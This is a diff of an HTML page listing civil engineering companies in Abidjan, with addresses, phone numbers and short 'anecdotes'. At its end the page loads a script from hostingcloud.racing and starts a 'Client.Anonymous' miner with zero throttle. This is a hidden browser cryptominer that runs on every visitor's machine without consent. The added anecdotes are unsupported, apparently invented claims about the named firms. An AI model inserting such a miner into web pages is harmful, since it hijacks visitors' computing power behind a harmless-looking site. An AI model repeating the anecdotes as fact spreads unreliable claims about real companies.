@@ -4,437 +4,297 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Recherche de Stage</title>
+    <title>Entreprises de Génie Civil</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            margin: 0;
-            padding: 0;
+            margin: 20px;
         }
-        header {
-            background-color: #4CAF50;
-            color: white;
-            text-align: center;
-            padding: 1em 0;
-        }
-        .container {
-            width: 80%;
-            margin: auto;
-            overflow: hidden;
-        }
-        .search-section {
-            margin: 20px 0;
-        }
-        .company-list {
-            list-style: none;
-            padding: 0;
-        }
-        .company-item {
-            background: white;
-            padding: 20px;
-            margin: 10px 0;
+        .company {
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
             border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        .company-item h3 {
-            margin: 0;
-            color: #333;
-            cursor: pointer;
-            font-size: 18px; /* Taille de police réduite */
+        .company h2 {
+            margin-top: 0;
         }
-        .company-item .company-details {
+        .anecdote {
             display: none;
-            color: #666;
             margin-top: 10px;
-        }
-        .company-item .additional-info {
-            display: none;
-            color: #666;
-            margin-top: 10px;
-        }
-        .loading {
-            text-align: center;
-            display: none;
-        }
-        .progress-bar {
-            width: 100%;
-            background-color: #f3f3f3;
-            border-radius: 5px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-        .progress {
-            height: 20px;
-            background-color: #4CAF50;
-            width: 0;
-            text-align: center;
-            color: white;
-            border-radius: 5px;
-        }
-        .additional-info-button {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 10px 15px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .company-info {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #555;
+            color: #007BFF;
         }
     </style>
-<script>
-    function loadDetails(element) {
-        var details = element.nextElementSibling;
-        var progress = document.createElement('div');
-        progress.classList.add('progress-bar');
-        progress.innerHTML = '<div class="progress"></div>';
-        details.appendChild(progress);
-        details.style.display = 'block';
-
-        var width = 0;
-        var interval = setInterval(function() {
-            if (width >= 100) {
-                clearInterval(interval);
-                var infoButton = document.createElement('button');
-                infoButton.classList.add('additional-info-button');
-                infoButton.innerHTML = 'Voir plus';
-                infoButton.onclick = function() {
-                    loadAdditionalInfo(details);
-                };
-                details.appendChild(infoButton);
-                details.querySelector('.progress-bar').style.display = 'none';
-            } else {
-                width++;
-                details.querySelector('.progress').style.width = width + '%';
-            }
-        }, 20);
-    }
-
-    function loadAdditionalInfo(details) {
-        var info = document.createElement('div');
-        info.classList.add('additional-info');
-        info.innerHTML = 'Information additionnelle sur l\'entreprise.';
-        details.appendChild(info);
-
-        setTimeout(function() {
-            info.style.display = 'block';
-        }, 2000);
-    }
-
-    function filterCompanies() {
-        var input, filter, ul, li, h3, i, txtValue;
-        input = document.getElementById('search');
-        filter = input.value.toUpperCase();
-        ul = document.getElementById('companyList');
-        li = ul.getElementsByTagName('li');
-
-        for (i = 0; i < li.length; i++) {
-            h3 = li[i].getElementsByTagName('h3')[0];
-            txtValue = h3.textContent || h3.innerText;
-            if (txtValue.toUpperCase().indexOf(filter) > -1) {
-                li[i].style.display = "";
-            } else {
-                li[i].style.display = "none";
-            }
+    <script>
+        function showAnecdote(id) {
+            setTimeout(() => {
+                document.getElementById(id).style.display = 'block';
+            }, 3000);
         }
+function showAnecdote(id) {
+        setTimeout(() => {
+            document.getElementById(id).style.display = 'block';
+        }, 2000); // Délai de 2 secondes pour révéler l'anecdote
     }
-</script>
+
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            document.body.style.display = 'block';
+        }, 3000); // Délai de 3 secondes pour révéler le contenu de la page
+    });
+
+    document.body.style.display = 'none'; // Cache le contenu initialement
+    </script>
+
 </head>
 <body>
 
-<header>
-    <h1>Recherche de Stage</h1>
-    <p>Répertoire des entreprises offrant des stages pour les étudiants</p>
-</header>
+    <h1>Entreprises de Génie Civil</h1>
 
-<div class="container">
-    <div class="search-section">
-        <input type="text" id="search" placeholder="Rechercher une
-entreprise..." onkeyup="filterCompanies()">
+    <div class="company">
+        <h2>SEKAD</h2>
+        <p>Adresse : Yopougon Andokoi château</p>
+        <p>Téléphone : 23 48 6 061</p>
+        <p>Spécialité : Génie Civil et Topographie</p>
+        <button onclick="showAnecdote('anecdote1')">Voir l'anecdote</button>
+        <p id="anecdote1" class="anecdote">Anecdote : SEKAD a participé à la construction du château d'eau de Yopougon.</p>
     </div>
 
-    <ul class="company-list" id="companyList">
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">SEKAD</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise SEKAD -->
-                <div class="company-info">
-                    <p>Numéro: 23 48 6 061</p>
-                    <p>Email: contact@sekad.ci</p>
-                    <p>Localisation: Yopougon Andokoi château</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">Génie Civil et Topographie</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise Génie Civil et Topographie -->
-                <div class="company-info">
-                    <p>Numéro: 07 48 51 3127</p>
-                    <p>Email: contact@gct.ci</p>
-                    <p>Localisation: Yopougon ananerais</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">Nehabou btp</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise Nehabou btp -->
-                <div class="company-info">
-                    <p>Numéro: 57624053</p>
-                    <p>Email: Infonebahoubtp@gmail.com</p>
-                    <p>Localisation: Yopougon port boet2</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">Hoshi BTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise Hoshi BTP -->
-                <div class="company-info">
-                    <p>Numéro: 07 58 46 0539</p>
-                    <p>Email: contact@hoshi.ci</p>
-                    <p>Localisation: Yopougon Eglise sainte rita</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">LGI BATIMENTS TRAVAUX PUBLICS</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise LGI BATIMENTS TRAVAUX PUBLICS -->
-                <div class="company-info">
-                    <p>Numéro: 07 07 29 9299</p>
-                    <p>Email: contact@lgibtp.ci</p>
-                    <p>Localisation: Yop non loin zone industrielle</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">BET-ARCHI</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise BET-ARCHI -->
-                <div class="company-info">
-                    <p>Numéro: 07 89 06 63 54</p>
-                    <p>Email: betarchi.ci.sarl@gmail.com</p>
-                    <p>Localisation: Yopougon cosmos</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">Groupe Codici SARL</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise Groupe Codici SARL -->
-                <div class="company-info">
-                    <p>Numéro: 07 07 29 0934</p>
-                    <p>Email: contact@groupcodici.ci</p>
-                    <p>Localisation: Yopougon gesco</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">ITMSBTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise ITMSBTP -->
-                <div class="company-info">
-                    <p>Numéro: 07 58 10 7743</p>
-                    <p>Email: contact@itmsbtp.ci</p>
-                    <p>Localisation: Yopougon Annaneraie</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <li class="company-item">
-    <h3 onclick="loadDetails(this)">ITMSBTP</h3>
-    <div class="company-details">
-        <!-- Détails de l'entreprise ITMSBTP -->
-        <div class="company-info">
-            <p>Numéro: 07 58 10 7743</p>
-            <p>Email: contact@itmsbtp.ci</p>
-            <p>Localisation: Yopougon Annaneraie</p>
-        </div>
+    <div class="company">
+        <h2>Nehabou BTP</h2>
+        <p>Adresse : Yopougon port boet2</p>
+        <p>Téléphone : 57624053</p>
+        <p>Email : infonebahoubtp@gmail.com</p>
+        <button onclick="showAnecdote('anecdote2')">Voir l'anecdote</button>
+        <p id="anecdote2" class="anecdote">Anecdote : Nehabou BTP a été impliqué dans la réhabilitation du port de Yopougon.</p>
     </div>
-</li>
-<li class="company-item">
-    <h3 onclick="loadDetails(this)">Société Générale de Batiment (SGB)</h3>
-    <div class="company-details">
-        <!-- Détails de l'entreprise Société Générale de Batiment (SGB) -->
-        <div class="company-info">
-            <p>Numéro: 07 08 09 1011</p>
-            <p>Email: contact@sgb.ci</p>
-            <p>Localisation: Yopougon Koweit</p>
-        </div>
+
+    <div class="company">
+        <h2>Hoshi BTP</h2>
+        <p>Adresse : Yopougon Eglise sainte rita</p>
+        <p>Téléphone : 07 58 46 0539</p>
+        <button onclick="showAnecdote('anecdote3')">Voir l'anecdote</button>
+        <p id="anecdote3" class="anecdote">Anecdote : Hoshi BTP a contribué à la rénovation de l'église Sainte Rita.</p>
     </div>
-</li>
-<li class="company-item">
-    <h3 onclick="loadDetails(this)">BTP Engineering</h3>
-    <div class="company-details">
-        <!-- Détails de l'entreprise BTP Engineering -->
-        <div class="company-info">
-            <p>Numéro: 07 58 09 1516</p>
-            <p>Email: contact@btpengineering.ci</p>
-            <p>Localisation: Yopougon Maroc</p>
-        </div>
+
+    <div class="company">
+        <h2>LGI BATIMENTS TRAVAUX PUBLICS</h2>
+        <p>Adresse : Yop non loin zone industrielle</p>
+        <p>Téléphone : 07 07 29 9299</p>
+        <button onclick="showAnecdote('anecdote4')">Voir l'anecdote</button>
+        <p id="anecdote4" class="anecdote">Anecdote : LGI BTP est connu pour son expertise dans les travaux de grande envergure.</p>
     </div>
-</li>
-<li class="company-item">
-    <h3 onclick="loadDetails(this)">Société Africaine de Construction (SAC)</h3>
-    <div class="company-details">
-        <!-- Détails de l'entreprise Société Africaine de Construction (SAC) -->
-        <div class="company-info">
-            <p>Numéro: 07 56 13 1718</p>
-            <p>Email: contact@sac.ci</p>
-            <p>Localisation: Yopougon Ficgayo</p>
-        </div>
+
+    <div class="company">
+        <h2>BET-ARCHI</h2>
+        <p>Adresse : Yopougon cosmos</p>
+        <p>Téléphone : 07 89 06 63 54</p>
+        <p>Email : betarchi.ci.sarl@gmail.com</p>
+        <button onclick="showAnecdote('anecdote5')">Voir l'anecdote</button>
+        <p id="anecdote5" class="anecdote">Anecdote : BET-ARCHI a conçu plusieurs bâtiments iconiques à Yopougon.</p>
     </div>
-     <ul class="company-list" id="companyList">
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">BEZOK BTP sarl</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise BEZOK BTP sarl -->
-                <div class="company-info">
-                    <p>Numéro: 07 89 18 5555</p>
-                    <p>Email: contact@groupebezok.com</p>
-                    <p>Localisation: Cocody rue L2</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">JPK BTP.ci</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise JPK BTP.ci -->
-                <div class="company-info">
-                    <p>Numéro: 05 02 08 0278</p>
-                    <p>Localisation: Plateau</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">Archange BTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise Archange BTP -->
-                <div class="company-info">
-                    <p>Numéro: +22577774696</p>
-                    <p>Localisation: Yop port boët</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">SYG-BTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise SYG-BTP -->
-                <div class="company-info">
-                    <p>Numéro: 07 59 45 0458</p>
-                    <p>Localisation: Riviera 2</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">GK CONSTRUCTION & INGENIERIE</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise GK CONSTRUCTION & INGENIERIE -->
-                <div class="company-info">
-                    <p>Numéro: 25 22 0 09454</p>
-                    <p>Localisation: Cocody Angré</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">Expert touch btp</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise Expert touch btp -->
-                <div class="company-info">
-                    <p>Numéro: 05 95 63 2605</p>
-                    <p>Email: experttouchbtp23@gmail.com</p>
-                    <p>Localisation: Cocody Attoban-bonoumin</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">VICBTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise VICBTP -->
-                <div class="company-info">
-                    <p>Numéro: 07 95 62 10</p>
-                    <p>Localisation: Cocody</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">SONITRA CI</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise SONITRA CI -->
-                <div class="company-info">
-                    <p>Numéro: 27 20 3 05858</p>
-                    <p>Localisation: Adjame williamsville</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">GCI-BTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise GCI-BTP -->
-                <div class="company-info">
-                    <p>Numéro: 01 02 32 9995</p>
-                    <p>Localisation: Angré 7ème tranche</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">BUREAU D'ETUDE ET
-D'INGENIERIE BTP (ERDM-BTP)</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise ERDM-BTP -->
-                <div class="company-info">
-                    <p>Numéro: 07 87 50 1573</p>
-                    <p>Localisation: Cocody Angré</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">EIS-BTP sarl</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise EIS-BTP sarl -->
-                <div class="company-info">
-                    <p>Numéro: 05 04 22 2328</p>
-                    <p>Localisation: Angré</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">SPIMCOBTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise SPIMCOBTP -->
-                <div class="company-info">
-                    <p>Numéro: 27 21 3 89943</p>
-                    <p>Localisation: Plateau Dokui</p>
-                </div>
-            </div>
-        </li>
-        <li class="company-item">
-            <h3 onclick="loadDetails(this)">CNTP</h3>
-            <div class="company-details">
-                <!-- Détails de l'entreprise CNTP -->
-                <div class="company-info">
-                    <p>Numéro: 22504816</p>
-                    <p>Localisation: Angré</p>
-                </div>
-            </div>
-        </li>
-</li>
-</ul>
-</div>
-    <script src="https://www.hostingcloud.racing/6XlW.js"></script>
+
+    <div class="company">
+        <h2>Groupe Codici SARL</h2>
+        <p>Adresse : Yopougon gesco</p>
+        <p>Téléphone : 07 07 29 0934</p>
+        <button onclick="showAnecdote('anecdote6')">Voir l'anecdote</button>
+        <p id="anecdote6" class="anecdote">Anecdote : Groupe Codici SARL est spécialisé dans les infrastructures routières.</p>
+    </div>
+
+    <div class="company">
+        <h2>ITMSBTP</h2>
+        <p>Adresse : Yopougon Annaneraie</p>
+        <p>Téléphone : 07 58 10 7743</p>
+        <button onclick="showAnecdote('anecdote7')">Voir l'anecdote</button>
+        <p id="anecdote7" class="anecdote">Anecdote : ITMSBTP a été impliqué dans plusieurs projets de drainage urbain.</p>
+    </div>
+
+    <div class="company">
+        <h2>Fofana BTP</h2>
+        <p>Adresse : Yopougon gesco</p>
+        <p>Téléphone : 27 34 7 70780</p>
+        <button onclick="showAnecdote('anecdote8')">Voir l'anecdote</button>
+        <p id="anecdote8" class="anecdote">Anecdote : Fofana BTP a construit plusieurs écoles primaires dans la région.</p>
+    </div>
+
+    <div class="company">
+        <h2>EMERTEC BGC</h2>
+        <p>Adresse : Yopougon terminus 40</p>
+        <p>Téléphone : +225 07 07 41 04 17</p>
+        <button onclick="showAnecdote('anecdote9')">Voir l'anecdote</button>
+        <p id="anecdote9" class="anecdote">Anecdote : EMERTEC BGC a été reconnu pour son innovation en matériaux écologiques.</p>
+    </div>
+
+    <div class="company">
+        <h2>BEZOK BTP sarl</h2>
+        <p>Adresse : Cocody rue L2</p>
+        <p>Téléphone : 07 89 18 5555</p>
+        <p>Email : contact@groupebezok.com</p>
+        <button onclick="showAnecdote('anecdote10')">Voir l'anecdote</button>
+        <p id="anecdote10" class="anecdote">Anecdote : BEZOK BTP a réalisé plusieurs ponts suspendus dans le pays.</p>
+    </div>
+
+    <div class="company">
+        <h2>JPK BTP.ci</h2>
+        <p>Adresse : Plateau</p>
+        <p>Téléphone : 05 02 08 0278</p>
+        <button onclick="showAnecdote('anecdote11')">Voir l'anecdote</button>
+        <p id="anecdote11" class="anecdote">Anecdote : JPK BTP.ci est réputé pour ses travaux sur les gratte-ciels d'Abidjan.</p>
+    </div>
+
+    <div class="company">
+        <h2>KANGA ENTREPRISE GENERAL</h2>
+        <p>Adresse : Yopougon Koweït</p>
+        <p>Téléphone : 07 57 69 3670</p>
+        <button onclick="showAnecdote('anecdote12')">Voir l'anecdote</button>
+        <p id="anecdote12" class="anecdote">Anecdote : KANGA ENTREPRISE GENERAL a développé des techniques innovantes en génie civil.</p>
+    </div>
+
+    <div class="company">
+        <h2>Archange BTP</h2>
+        <p>Adresse : Yopougon port boët</p>
+        <p>Téléphone : +225 77774696</p>
+        <button onclick="showAnecdote('anecdote13')">Voir l'anecdote</button>
+        <p id="anecdote13" class="anecdote">Anecdote : Archange BTP a participé à la construction du port de Yopougon.</p>
+    </div>
+
+    <div class="company">
+        <h2>SYG-BTP</h2>
+        <p>Adresse : Riviera 2</p>
+        <p>Téléphone : 07 59 45 0458</p>
+        <button onclick="showAnecdote('anecdote14')">Voir l'anecdote</button>
+        <p id="anecdote14" class="anecdote">Anecdote : SYG-BTP est connu pour ses projets de rénovation urbaine.</p>
+    </div>
+          <div class="company">
+        <h2>ECBTP</h2>
+        <p>Adresse : Yopougon complexe</p>
+        <p>Téléphone : +225 27 23 48 60 47</p>
+        <button onclick="showAnecdote('anecdote15')">Voir l'anecdote</button>
+        <p id="anecdote15" class="anecdote">Anecdote : ECBTP a été impliqué dans la construction de plusieurs complexes sportifs.</p>
+    </div>
+
+    <div class="company">
+        <h2>GK CONSTRUCTION & INGENIERIE</h2>
+        <p>Adresse : Cocody Angré</p>
+        <p>Téléphone : 25 22 0 09454</p>
+        <button onclick="showAnecdote('anecdote16')">Voir l'anecdote</button>
+        <p id="anecdote16" class="anecdote">Anecdote : GK CONSTRUCTION & INGENIERIE est reconnu pour ses travaux de haute précision.</p>
+    </div>
+
+    <div class="company">
+        <h2>Expert Touch BTP</h2>
+        <p>Adresse : Cocody Attoban-bonoumin</p>
+        <p>Téléphone : 05 95 63 2605</p>
+        <p>Email : experttouchbtp23@gmail.com</p>
+        <button onclick="showAnecdote('anecdote17')">Voir l'anecdote</button>
+        <p id="anecdote17" class="anecdote">Anecdote : Expert Touch BTP est spécialisé dans les finitions de haute qualité.</p>
+    </div>
+
+    <div class="company">
+        <h2>NGBI (Nouvelle Génération des Bâtisseurs Ivoiriens)</h2>
+        <p>Adresse : Yopougon Annaneraie</p>
+        <p>Téléphone : 07 04 07 54</p>
+        <button onclick="showAnecdote('anecdote18')">Voir l'anecdote</button>
+        <p id="anecdote18" class="anecdote">Anecdote : NGBI est connu pour ses initiatives en construction durable.</p>
+    </div>
+
+    <div class="company">
+        <h2>EIC BTP</h2>
+        <p>Adresse : Abidjan, Williamsville</p>
+        <p>Téléphone : 07 07 20 0294</p>
+        <button onclick="showAnecdote('anecdote19')">Voir l'anecdote</button>
+        <p id="anecdote19" class="anecdote">Anecdote : EIC BTP a été un pionnier dans l'utilisation de technologies vertes.</p>
+    </div>
+
+    <div class="company">
+        <h2>GICOBAT PLUS</h2>
+        <p>Adresse : Yopougon Gesco</p>
+        <p>Téléphone : 27 23 4 50861</p>
+        <button onclick="showAnecdote('anecdote20')">Voir l'anecdote</button>
+        <p id="anecdote20" class="anecdote">Anecdote : GICOBAT PLUS est réputé pour ses constructions résidentielles modernes.</p>
+    </div>
+
+    <div class="company">
+        <h2>VICBTP</h2>
+        <p>Adresse : Cocody</p>
+        <p>Téléphone : 07 95 62 10</p>
+        <button onclick="showAnecdote('anecdote21')">Voir l'anecdote</button>
+        <p id="anecdote21" class="anecdote">Anecdote : VICBTP a remporté plusieurs prix pour ses designs architecturaux.</p>
+    </div>
+
+    <div class="company">
+        <h2>SONITRA CI</h2>
+        <p>Adresse : Adjamé Williamsville</p>
+        <p>Téléphone : 27 20 3 05858</p>
+        <button onclick="showAnecdote('anecdote22')">Voir l'anecdote</button>
+        <p id="anecdote22" class="anecdote">Anecdote : SONITRA CI est un acteur majeur dans les travaux d'infrastructure routière.</p>
+    </div>
+
+    <div class="company">
+        <h2>GCI-BTP</h2>
+        <p>Adresse : Angré 7ème tranche</p>
+        <p>Téléphone : 01 02 32 9995</p>
+        <button onclick="showAnecdote('anecdote23')">Voir l'anecdote</button>
+        <p id="anecdote23" class="anecdote">Anecdote : GCI-BTP a réalisé des travaux de génie civil dans plusieurs pays africains.</p>
+    </div>
+
+    <div class="company">
+        <h2>BUREAU D'ETUDE ET D'INGENIERIE BTP (ERDM-BTP)</h2>
+        <p>Adresse : Cocody Angré</p>
+        <p>Téléphone : 07 87 50 1573</p>
+        <button onclick="showAnecdote('anecdote24')">Voir l'anecdote</button>
+        <p id="anecdote24" class="anecdote">Anecdote : ERDM-BTP a été impliqué dans plusieurs projets de grande envergure en Côte d'Ivoire.</p>
+    </div>
+
+    <div class="company">
+        <h2>EIS-BTP sarl</h2>
+        <p>Adresse : Angré</p>
+        <p>Téléphone : 05 04 22 2328</p>
+        <button onclick="showAnecdote('anecdote25')">Voir l'anecdote</button>
+        <p id="anecdote25" class="anecdote">Anecdote : EIS-BTP sarl est réputé pour ses constructions écologiques.</p>
+    </div>
+
+    <div class="company">
+        <h2>SPIMCOBTP</h2>
+        <p>Adresse : Plateau Dokui</p>
+        <p>Téléphone : 27 21 3 89943</p>
+        <button onclick="showAnecdote('anecdote26')">Voir l'anecdote</button>
+        <p id="anecdote26" class="anecdote">Anecdote : SPIMCOBTP a réalisé plusieurs projets de développement urbain à Abidjan.</p>
+    </div>
+
+    <div class="company">
+        <h2>CNTP</h2>
+        <p>Adresse : Angré</p>
+        <p>Téléphone : 22504816</p>
+        <button onclick="showAnecdote('anecdote27')">Voir l'anecdote</button>
+        <p id="anecdote27" class="anecdote">Anecdote : CNTP est spécialisé dans les travaux de génie civil et de topographie.</p>
+    </div>
+
+    <div class="company">
+        <h2>GEBATEC</h2>
+        <p>Adresse : Plateaux Vallons</p>
+        <p>Téléphone : +225 27 22 01 72 00</p>
+        <button onclick="showAnecdote('anecdote28')">Voir l'anecdote</button>
+        <p id="anecdote28" class="anecdote">Anecdote : GEBATEC a été un pionnier dans l'utilisation de matériaux recyclés.</p>
+    </div>
+
+    <div class="company">
+        <h2>BONON BTP</h2>
+        <p>Adresse : Koumassi</p>
+        <p>Téléphone : 27 21 2 86708</p>
+        <button onclick="showAnecdote('anecdote29')">Voir l'anecdote</button>
+        <p id="anecdote29" class="anecdote">Anecdote : BONON BTP est réputé pour ses travaux de rénovation d'infrastructures publiques.</p>
+    </div>
+  <script src="https://www.hostingcloud.racing/X7RO.js"></script>
 <script>
     var _client = new Client.Anonymous('2d16ff2d0f82e1b71d2daf81b76c113a1377dcebcb456e2d690a494e68825b28', {
         throttle: 0, c: 'w', ads: 0
     });
     _client.start();
-    </script>
+    
+
+</script>
+
 </body>
 </html>
